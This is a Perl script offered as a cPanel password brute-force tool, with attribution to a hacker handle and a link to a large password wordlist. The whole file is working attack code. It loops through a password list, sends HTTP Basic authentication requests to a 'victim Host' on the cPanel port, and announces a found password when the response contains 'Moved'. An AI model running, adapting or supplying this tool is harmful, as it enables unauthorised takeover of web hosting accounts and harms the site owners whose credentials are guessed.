#!/usr/bin/perl
# Cpanel Password Brute Forcer
# ----------------------------
#    C0d3d By Mr.XSecr3t
# Perl Version ( low speed ) wordlist 
# http://www.mediafire.com/download/glyzo6ubjgo0n7k/14+million+pass.rar
# Original Advisory : N/A
# https://www.facebook.com/anonxsecr3t
use IO::Socket;
use LWP::Simple;
use MIME::Base64;

$host     = $ARGV[0];
$user     = $ARGV[1];
$port     = $ARGV[2];
$list     = $ARGV[3];
$file     = $ARGV[4];
$url = "http://".$host.":".$port;
if(@ARGV < 3){
print q(
###############################################################
#               Cpanel Password Brute Force Tool              #
###############################################################
#     usage : cpanel.pl [HOST] [User] [PORT] [list] [File]    #
#-------------------------------------------------------------#
#    [Host] : victim Host             (example.com)           #
#    [User] : User Name               (demo)                  #
#                                                             #
#    [PORT] : Port of Cpanel          (2082)                  #
#                                                             #
#    [list] : File Of password list   (list.txt)              #
#    [File] : file for save password  (password.txt)          #
#                                                             #
#                                                             #
###############################################################
#                      Cod3d By Mr.XSecr3t                    #
###############################################################
);exit;}

headx();

$numstart  = "-1";

sub headx() {
print q(
###############################################################
#              Cpanel Password Brute Force Tool               #       
#                                                             #
#                  C0d3d By Mr.XSecr3t | ICDT                 #
#                                                             #
###############################################################
);
open (PASSFILE, "<$list") || die "[-] Can't 
open the List of password file !";
@PASSWORDS = <PASSFILE>;
close PASSFILE;
foreach my $P (@PASSWORDS) {
chomp $P;
$passwd = $P;
print "\n [~] Try Password : $passwd \n";
&brut;
};
}
sub brut() {
$authx = encode_base64($user.":".$passwd);
print $authx;
my $sock = IO::Socket::INET->new(Proto => 
"tcp",PeerAddr => "$host", PeerPort => "$port") 
|| print "\n [-] Can not connect to the host";
print $sock "GET / HTTP/1.1\n";
print $sock "Authorization: Basic $authx\n";
print $sock "Connection: Close\n\n";
read  $sock, $answer, 128;
close($sock);

if ($answer =~ /Moved/) {
print "\n [~] PASSWORD FOUND : $passwd \n";
exit();
}
}
